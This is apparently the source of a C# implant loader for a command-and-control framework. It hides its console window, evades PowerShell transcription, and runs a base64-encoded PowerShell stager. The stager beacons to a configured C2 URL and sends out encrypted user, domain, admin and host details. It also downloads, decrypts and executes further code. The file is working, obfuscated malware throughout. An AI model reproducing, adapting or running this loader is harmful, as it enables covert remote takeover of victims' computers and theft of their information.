using System;
using System.Text;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

public class Program
{
    [DllImport("kernel32.dll")] static extern IntPtr GetConsoleWindow();
    [DllImport("user32.dll")] static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    
    public const int SW_HIDE = 0;
    public const int SW_SHOW = 5;
    public static string basepayload = "W1N5c3RlbS5OZXQuU2VydmljZVBvaW50TWFuYWdlcl06OlNlcnZlckNlcnRpZmljYXRlVmFsaWRhdGlvbkNhbGxiYWNrID0geyR0cnVlfQokZGY9QCgiIikKJGg9IiIKJHNjPSIiCiR1cmxzPUAoImh0dHBzOi8vMTI3LjAuMC4xIikKJGN1cmw9Ii9jbGllbnRfMjA0LyIKJHM9JHVybHNbMF0KZnVuY3Rpb24gQ0FNICgka2V5LCRJVil7CnRyeSB7JGEgPSBOZXctT2JqZWN0ICJTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LlJpam5kYWVsTWFuYWdlZCIKfSBjYXRjaCB7JGEgPSBOZXctT2JqZWN0ICJTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LkFlc0NyeXB0b1NlcnZpY2VQcm92aWRlciJ9CiRhLk1vZGUgPSBbU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5DaXBoZXJNb2RlXTo6Q0JDCiRhLlBhZGRpbmcgPSBbU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5QYWRkaW5nTW9kZV06Olplcm9zCiRhLkJsb2NrU2l6ZSA9IDEyOAokYS5LZXlTaXplID0gMjU2CmlmICgkSVYpCnsKaWYgKCRJVi5nZXRUeXBlKCkuTmFtZSAtZXEgIlN0cmluZyIpCnskYS5JViA9IFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJElWKX0KZWxzZQp7JGEuSVYgPSAkSVZ9Cn0KaWYgKCRrZXkpCnsKaWYgKCRrZXkuZ2V0VHlwZSgpLk5hbWUgLWVxICJTdHJpbmciKQp7JGEuS2V5ID0gW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygka2V5KX0KZWxzZQp7JGEuS2V5ID0gJGtleX0KfQokYX0KZnVuY3Rpb24gRU5DICgka2V5LCR1bil7CiRiID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRCeXRlcygkdW4pCiRhID0gQ0FNICRrZXkKJGUgPSAkYS5DcmVhdGVFbmNyeXB0b3IoKQokZiA9ICRlLlRyYW5zZm9ybUZpbmFsQmxvY2soJGIsIDAsICRiLkxlbmd0aCkKW2J5dGVbXV0gJHAgPSAkYS5JViArICRmCltTeXN0ZW0uQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKCRwKQp9CmZ1bmN0aW9uIERFQyAoJGtleSwkZW5jKXsKJGIgPSBbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCRlbmMpCiRJViA9ICRiWzAuLjE1XQokYSA9IENBTSAka2V5ICRJVgokZCA9ICRhLkNyZWF0ZURlY3J5cHRvcigpCiR1ID0gJGQuVHJhbnNmb3JtRmluYWxCbG9jaygkYiwgMTYsICRiLkxlbmd0aCAtIDE2KQpbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKCR1KS5UcmltKFtjaGFyXTApKSl9CmZ1bmN0aW9uIEdldC1XZWJjbGllbnQgKCRDb29raWUpIHsKJGQgPSAoR2V0LURhdGUgLUZvcm1hdCAieXl5eS1NTS1kZCIpOwokZCA9IFtkYXRldGltZV06OlBhcnNlRXhhY3QoJGQsInl5eXktTU0tZGQiLCRudWxsKTsKJGsgPSBbZGF0ZXRpbWVdOjpQYXJzZUV4YWN0KCIyOTk5LTEyLTAxIiwieXl5eS1NTS1kZCIsJG51bGwpOwppZiAoJGsgLWx0ICRkKSB7ZXhpdH0KJHVzZXJuYW1lID0gIiIKJHBhc3N3b3JkID0gIiIKJHByb3h5dXJsID0gIiIKJHdjID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudDsKCmlmICgkaCAtYW5kICgoJHBzdmVyc2lvbnRhYmxlLkNMUlZlcnNpb24uTWFqb3IgLWd0IDIpKSkgeyR3Yy5IZWFkZXJzLkFkZCgiSG9zdCIsJGgpfQplbHNlaWYoJGgpeyRzY3JpcHQ6cz0iaHR0cHM6Ly8kKCRoKS9jbGllbnRfMjA0LyI7JHNjcmlwdDpzYz0iaHR0cHM6Ly8kKCRoKSJ9CiR3Yy5IZWFkZXJzLkFkZCgiVXNlci1BZ2VudCIsIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS84MC4wLjM5ODcuMTIyIFNhZmFyaS81MzcuMzYiKQokd2MuSGVhZGVycy5BZGQoIlJlZmVyZXIiLCIiKQppZiAoJHByb3h5dXJsKSB7CiR3cCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJQcm94eSgkcHJveHl1cmwsJHRydWUpOwppZiAoJHVzZXJuYW1lIC1hbmQgJHBhc3N3b3JkKSB7CiRQU1MgPSBDb252ZXJ0VG8tU2VjdXJlU3RyaW5nICRwYXNzd29yZCAtQXNQbGFpblRleHQgLUZvcmNlOwokZ2V0Y3JlZHMgPSBuZXctb2JqZWN0IHN5c3RlbS5tYW5hZ2VtZW50LmF1dG9tYXRpb24uUFNDcmVkZW50aWFsICR1c2VybmFtZSwkUFNTOwokd3AuQ3JlZGVudGlhbHMgPSAkZ2V0Y3JlZHM7Cn0gZWxzZSB7ICR3Yy5Vc2VEZWZhdWx0Q3JlZGVudGlhbHMgPSAkdHJ1ZTsgfQokd2MuUHJveHkgPSAkd3A7IH0gZWxzZSB7CiR3Yy5Vc2VEZWZhdWx0Q3JlZGVudGlhbHMgPSAkdHJ1ZTsKJHdjLlByb3h5LkNyZWRlbnRpYWxzID0gJHdjLkNyZWRlbnRpYWxzOwp9IGlmICgkY29va2llKSB7ICR3Yy5IZWFkZXJzLkFkZChbU3lzdGVtLk5ldC5IdHRwUmVxdWVzdEhlYWRlcl06OkNvb2tpZSwgIlNlc3Npb25JRD0kQ29va2llIikgfQokd2N9CmZ1bmN0aW9uIHByaW1lcm4oJHVybCwkdXJpLCRkZikgewokc2NyaXB0OnM9JHVybCskdXJpCiRzY3JpcHQ6c2M9JHVybAokc2NyaXB0Omg9JGRmCiRjdSA9IFtTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eV06OkdldEN1cnJlbnQoKQokd3AgPSBOZXctT2JqZWN0IFN5c3RlbS5TZWN1cml0eS5QcmluY2lwYWwuV2luZG93c1ByaW5jaXBhbCgkY3UpCiRhZyA9IFtTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NCdWlsdEluUm9sZV06OkFkbWluaXN0cmF0b3IKaWYgKCR3cC5Jc0luUm9sZSgkYWcpKXskZWw9IioifWVsc2V7JGVsPSIifQp0cnl7JHU9KCRjdSkubmFtZSskZWx9IGNhdGNoe2lmICgkZW52OnVzZXJuYW1lIC1lcSAiJCgkZW52OmNvbXB1dGVybmFtZSkkIil7fWVsc2V7JHU9JGVudjp1c2VybmFtZX19CiRvPSIkZW52OnVzZXJkb21haW47JHU7JGVudjpjb21wdXRlcm5hbWU7JGVudjpQUk9DRVNTT1JfQVJDSElURUNUVVJFOyRwaWQ7MSIKdHJ5IHskcHA9ZW5jIC1rZXkgUXkrYURVNTBNeHBxUFVTUjlFZXNQT0FsWGhObVpxaXlWdlZvMmFMNEtGTT0gLXVuICRvfSBjYXRjaCB7JHBwPSJFUlJPUiJ9CiRwcmltZXJuID0gKEdldC1XZWJjbGllbnQgLUNvb2tpZSAkcHApLmRvd25sb2Fkc3RyaW5nKCRzY3JpcHQ6cykKJHAgPSBkZWMgLWtleSBReSthRFU1ME14cHFQVVNSOUVlc1BPQWxYaE5tWnFpeVZ2Vm8yYUw0S0ZNPSAtZW5jICRwcmltZXJuCmlmICgkcCAtbGlrZSAiKmtleSoiKSB7JHB8IGlleH0KfQpmdW5jdGlvbiBwcmltZXJzIHsKaWYoIVtzdHJpbmddOjpJc051bGxPckVtcHR5KCIiKSAtYW5kICFbRW52aXJvbm1lbnRdOjpVc2VyRG9tYWluTmFtZS5Db250YWlucygiIikpCnsKICAgIHJldHVybjsKfQpmb3JlYWNoKCR1cmwgaW4gJHVybHMpewokaW5kZXggPSBbYXJyYXldOjpJbmRleE9mKCR1cmxzLCAkdXJsKQp0cnkge3ByaW1lcm4gJHVybCAkY3VybCAkZGZbJGluZGV4XX0gY2F0Y2gge3dyaXRlLW91dHB1dCAkZXJyb3JbMF19fX0KJGxpbWl0PTMwCmlmKCR0cnVlKXsKICAgICR3YWl0ID0gNjAKICAgIHdoaWxlKCR0cnVlIC1hbmQgJGxpbWl0IC1ndCAwKXsKICAgICAgICAkbGltaXQgPSAkbGltaXQgLTE7CiAgICAgICAgcHJpbWVycwogICAgICAgIFN0YXJ0LVNsZWVwICR3YWl0CiAgICAgICAgJHdhaXQgPSAkd2FpdCAqIDI7CiAgICB9Cn0KZWxzZQp7CiAgICBwcmltZXJzCn0K";
    
    public Program() {
        try
        {
            string tt = System.Text.Encoding.Unicode.GetString(System.Convert.FromBase64String(basepayload));
            InvokeAutomation(tt);
        }
        catch
        {
            Main();
        }
    }
    public static string InvokeAutomation(string cmd)
    {
        Runspace newrunspace = RunspaceFactory.CreateRunspace();
        newrunspace.Open();

        // transcript evasion
        RunspaceInvoke scriptInvoker = new RunspaceInvoke(newrunspace);
        var cmdin = new System.Management.Automation.PSVariable("c");
        newrunspace.SessionStateProxy.PSVariable.Set(cmdin);
        var output = new System.Management.Automation.PSVariable("o");
        newrunspace.SessionStateProxy.PSVariable.Set(output);

        Pipeline pipeline = newrunspace.CreatePipeline();
        newrunspace.SessionStateProxy.SetVariable("c", cmd);
        pipeline.Commands.AddScript("$o = IEX $c | Out-String");
        Collection<PSObject> results = pipeline.Invoke();
        newrunspace.Close();

        StringBuilder stringBuilder = new StringBuilder();
        foreach (PSObject obj in results)
        {
            stringBuilder.Append(obj);
        }
        return stringBuilder.ToString().Trim();
    }
    public static void Sharp()
    {
        var handle = GetConsoleWindow();
        ShowWindow(handle, SW_HIDE);
        try
        {
            string cmd = Encoding.UTF8.GetString(System.Convert.FromBase64String(basepayload));
            InvokeAutomation(cmd);
        }
        catch { }
    }
    public static void Main()
    {
        Sharp();
    }
}